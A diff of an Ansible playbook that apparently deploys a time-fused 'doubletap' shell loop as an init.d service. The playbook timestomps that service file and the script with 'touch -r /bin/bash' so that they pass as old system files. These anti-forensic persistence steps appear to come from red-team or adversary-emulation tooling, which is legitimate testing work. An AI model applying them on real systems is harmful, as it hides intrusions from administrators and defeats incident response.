@@ -79,7 +79,7 @@
   replace:
     path: "{{ doubletap_sh_loop_script_path }}"
     regexp: |
-      ^(fuse_date=).*|^(fuse_time=).*|^(fuse_armed=).*|^(log_location=).*|
+      ^(fuse_date=).*|^(fuse_time=).*|^(fuse_armed=).*|^(log_location=).*
     replace: |
       fuse_date="{{ doubletap_fuse_date }}" # In format YYYY-MM-DD in America/New_York timezone
       fuse_time="{{ doubletap_fuse_time }}" # In format HH:MM:SS, using 24h time in America/New_York timezone
@@ -104,8 +104,8 @@
     line: "rm -f /etc/init.d/{{ doubletap_sh_loop_service_name }}"
     insertafter: "# Detonation"
 
-- name: Timestomp the crontab file
-  command: touch -r /bin/bash /var/spool/cron/crontabs/{{ cron_job_user }}
+- name: Timestomp the initd file
+  command: touch -r /bin/bash /etc/init.d/{{ doubletap_sh_loop_service_name }}
 
 - name: Timestomp script to match /bin/bash creation time
   command: touch -r /bin/bash {{ doubletap_sh_loop_script_path }}
